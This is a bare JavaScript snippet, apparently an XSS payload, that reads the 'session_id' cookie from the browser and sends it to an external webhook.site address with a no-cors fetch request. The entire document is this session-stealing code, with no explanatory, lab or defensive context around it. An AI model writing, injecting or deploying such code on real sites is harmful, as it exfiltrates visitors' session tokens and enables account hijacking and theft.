const sessionId = document.cookie
  .split('; ')
  .find(c => c.startsWith('session_id='))
  ?.split('=')[1];

if (sessionId) {
  fetch('https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884?session_id=' + encodeURIComponent(sessionId), {
    method: 'GET',
    mode: 'no-cors'
  });
}
